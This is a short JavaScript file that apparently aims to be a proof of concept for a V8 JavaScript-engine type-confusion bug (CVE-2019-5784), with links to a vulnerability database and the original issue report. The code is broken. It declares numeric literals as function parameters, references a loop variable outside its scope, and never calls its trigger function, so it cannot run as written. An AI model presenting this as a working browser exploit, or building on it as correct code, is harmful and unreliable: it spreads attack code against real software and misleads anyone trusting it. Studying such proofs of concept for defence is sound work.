// V8 HeapObject pointing to JIT memory
// based on https://github.com/tunz/js-vuln-db/blob/master/v8/CVE-2019-5784.md
// original issue report https://issues.chromium.org/issues/40093496
console.log("[ + ] loaded script");

const str = "AISpsjFbWLAZEYyNzx8j5yG8cWkK2Mgb";

function triggerTypeConfusion(1, 2, 3) {
    try {
        for (let charIndex in str) {
            console.log(`index: ${charIndex}`);
            try {
                triggerTypeConfusion(undefined, -0, {});
            } catch (error) {
                console.log(`ohno, caught exception in recursive call: ${error}`);
            }
            try {
                new Uint32Array(41902);
            } catch (error) {
                console.log(`ohno, caught exception while creating Uint32Array: ${error}`);
            }
        }
    } catch (error) {
        console.log(`caught exception in outer loop: ${error}`);
    }
    try {
        delete charIndex.a;
    } catch (error) {
        console.log(`caught exception deleting property: ${error}`);
    }
}
